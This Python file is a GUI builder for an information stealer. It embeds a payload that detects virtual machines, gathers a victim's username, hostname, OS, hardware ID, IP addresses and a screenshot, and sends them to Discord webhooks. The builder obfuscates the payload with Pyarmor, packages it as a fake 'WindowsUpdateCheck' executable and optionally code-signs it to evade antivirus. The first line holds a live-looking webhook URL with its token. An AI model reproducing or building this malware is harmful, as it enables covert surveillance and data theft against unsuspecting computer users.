https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import sys
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
import re
import shutil
import tempfile
import textwrap
import requests
import uuid
import platform
import winreg
import random  # Added for random delays/names

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in (200, 204):
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Recon Stealer Builder - Nuclear Edition")
    root.geometry("700x450")
    root.resizable(False, False)

    tk.Label(root, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
    webhook_entry = tk.Entry(root, width=90)
    webhook_entry.pack(pady=5)

    tk.Label(root, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
    pfx_entry = tk.Entry(root, width=90)
    pfx_entry.pack(pady=5)

    tk.Label(root, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
    pass_entry = tk.Entry(root, width=90, show="*")
    pass_entry.pack(pady=5)

    tk.Label(root, text="Pyarmor Mode (0=normal, 1=advanced, 2=super/RFT if licensed):", font=("Arial", 9)).pack(pady=10)
    mode_var = tk.IntVar(value=1)
    tk.Radiobutton(root, text="0 - Basic", variable=mode_var, value=0).pack()
    tk.Radiobutton(root, text="1 - Advanced (default)", variable=mode_var, value=1).pack()
    tk.Radiobutton(root, text="2 - Super Mode (RFT)", variable=mode_var, value=2).pack()

    def run_test():
        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
        if not hooks:
            messagebox.showerror("Nope", "Enter at least one webhook.")
            return
        results = []
        for h in hooks:
            success, msg = test_webhook(h)
            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
        messagebox.showinfo("Test Results", "\n".join(results))

    tk.Button(root, text="TEST WEBHOOKS", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)

    progress = ttk.Progressbar(root, mode="indeterminate")

    def build():
        raw_hooks = webhook_entry.get().strip()
        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
            return
        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
        pfx_path = pfx_entry.get().strip()
        pfx_pass = pass_entry.get().strip() or None
        mode = mode_var.get()

        progress.pack(pady=15)
        progress.start()
        root.update()

        try:
            generate_malware(webhooks, pfx_path, pfx_pass, mode)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", "stealer.exe ready.\nObfuscated with pyarmor gen, screenshot + multi-exfil.\nHarder AV evasion.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", str(e))
        root.destroy()

    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
    root.mainloop()

# =================== STEALER CODE (unchanged from last) ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import winreg
import random
from datetime import datetime

try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False

def is_vm():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
        val = winreg.QueryValueEx(key, "0")[0].lower()
        if any(x in val for x in ["vmware", "vbox", "virtual", "qemu", "xen"]):
            return "Yes (Disk Enum)"
        winreg.CloseKey(key)
    except: pass

    try:
        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
            return "Yes (SystemInfo)"
    except: pass

    try:
        if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
            return "Yes (VBox Driver)"
    except: pass

    try:
        model = subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower()
        if "vmware" in model or "virtual" in model:
            return "Yes (VMware/Virtual Model)"
    except: pass

    class MEM(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
    mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
    if mem.ullTotalPhys < 4 * 1024**3:
        return "Yes (Low RAM <4GB)"

    try:
        vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "xenservice.exe"]
        output = subprocess.check_output("tasklist", text=True)
        if any(p in output.lower() for p in vm_procs):
            return "Yes (VM Process)"
    except: pass

    return "No"

def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            return requests.get(url, timeout=5).text.strip()
        except:
            continue
    return "Failed"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Failed"

def get_hwid():
    try:
        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
    except:
        return str(uuid.getnode())

def exfil(webhooks):
    time.sleep(random.uniform(5, 15))

    data = f"""
RECON REPORT - {datetime.utcnow().isoformat()} UTC
================================================
Username      : {os.getenv("USERNAME")}
Computer Name : {platform.node()}
OS            : {platform.system()} {platform.release()} ({platform.version()})
CPU           : {platform.processor()}
HWID          : {get_hwid()}
VM Detected   : {is_vm()}
Public IP     : {get_public_ip()}
Local IP      : {get_local_ip()}
"""

    files_to_send = {}
    temp_files = []

    recon_file = os.path.join(os.getenv("TEMP"), f"update_{random.randint(10000,99999)}.txt")
    with open(recon_file, "w", encoding="utf-8") as f:
        f.write(data)
    files_to_send["recon.txt"] = open(recon_file, "rb")
    temp_files.append(recon_file)

    if HAS_PYAUTO:
        try:
            screen_path = os.path.join(os.getenv("TEMP"), f"screen_{random.randint(10000,99999)}.png")
            pyautogui.screenshot(screen_path)
            files_to_send["screenshot.png"] = open(screen_path, "rb")
            temp_files.append(screen_path)
        except:
            pass

    for hook in webhooks:
        try:
            payload = {"content": f"**New recon hit** - {os.getenv('USERNAME')}@{platform.node()}"}
            resp = requests.post(hook, data=payload, files=files_to_send, timeout=20)
            if resp.status_code in (200, 204):
                break
        except:
            continue
    else:
        try:
            requests.post(webhooks[0], json={"content": f"Fallback recon (file send failed):\\n```\\n{data}\\n```"})
        except:
            pass

    for f in files_to_send.values():
        try: f.close()
        except: pass
    for p in temp_files:
        try: os.remove(p)
        except: pass

exfil({WEBHOOK_PLACEHOLDER})
''')

# =================== BUILD ===================
def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=1):
    if not shutil.which("pyarmor"):
        raise Exception("pyarmor not found. pip install pyarmor")

    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
    script = os.path.join(temp_dir, "recon.py")

    hook_str = repr(webhooks)
    with open(script, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))

    obf_dir = os.path.join(temp_dir, "obf")

    # Modern pyarmor gen command
    gen_cmd = ["pyarmor", "gen", "-O", obf_dir]
    if mode == 1:
        gen_cmd += ["--advanced", "2", "--mix-str"]
    elif mode == 2:
        gen_cmd += ["--enable-rft"]  # Super mode - needs pro license
    gen_cmd += [script]

    result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"Pyarmor gen failed:\n{result.stderr}\n{result.stdout}")

    obf_script = os.path.join(obf_dir, "recon.py")

    # PyInstaller on obfuscated output
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", "WindowsUpdateCheck",
        "--clean",
        "--hidden-import=winreg",
        "--hidden-import=pyautogui",
        "--hidden-import=requests",
        "--add-data", f"{obf_dir}{os.pathsep}pyarmor_runtime*",  # Runtime package
        obf_script
    ]

    result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"PyInstaller failed:\n{result.stderr}")

    exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
    final = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(exe, final)

    # Signing
    if pfx_path and os.path.exists(pfx_path):
        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256"]
        if pfx_pass:
            sign_cmd += ["/p", pfx_pass]
        sign_cmd += [final]
        sign_result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if sign_result.returncode != 0:
            print(f"Signing failed (non-fatal):\n{sign_result.stderr}")
        else:
            print("EXE signed.")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Nuclear stealer built: {final}")

if __name__ == "__main__":
    get_webhook()
